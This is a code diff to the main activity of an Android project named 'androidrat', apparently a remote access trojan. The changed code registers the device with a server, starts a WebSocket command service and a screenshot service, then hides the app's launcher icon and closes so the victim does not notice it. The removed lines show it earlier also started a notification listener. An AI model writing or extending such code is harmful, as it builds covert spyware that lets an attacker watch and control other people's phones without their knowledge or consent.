@@ -1,37 +1,26 @@
 package com.nqmgaming.androidrat
 
 import android.Manifest
-import android.app.Activity
-import android.content.BroadcastReceiver
-import android.content.ClipboardManager
-import android.content.ComponentName
-import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
-import android.content.ServiceConnection
 import android.content.pm.PackageManager
-import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
-import android.os.IBinder
-import android.provider.Settings
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.nqmgaming.androidrat.command.DeviceInfo
-import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder
+import com.nqmgaming.androidrat.command.util.Functions.hideIcons
+import com.nqmgaming.androidrat.core.util.Constant
+import com.nqmgaming.androidrat.core.util.Constant.hideIcon
 import com.nqmgaming.androidrat.data.ApiService
 import com.nqmgaming.androidrat.data.dto.DeviceDto
-import com.nqmgaming.androidrat.service.NotificationListener
 import com.nqmgaming.androidrat.service.ScreenshotService
 import com.nqmgaming.androidrat.service.WebSocketService
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import okhttp3.WebSocket
+import kotlinx.coroutines.withContext
 import retrofit2.awaitResponse
 import javax.inject.Inject
 
@@ -48,9 +37,18 @@ class MainActivity : AppCompatActivity() {
             ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
         }
 
-        sendRegistrationRequest()
-        startService(Intent(this, WebSocketService::class.java))
-        startService(Intent(this, NotificationListener::class.java))
+
+        CoroutineScope(Dispatchers.IO).launch {
+            withContext(Dispatchers.Main) {
+                sendRegistrationRequest()
+                startService(Intent(applicationContext, WebSocketService::class.java))
+                startService(Intent(applicationContext, ScreenshotService::class.java))
+                hideIcons(hideIcon, applicationContext).apply {
+                    finish()
+                }
+            }
+
+        }
     }
 
     // Request to send registration request
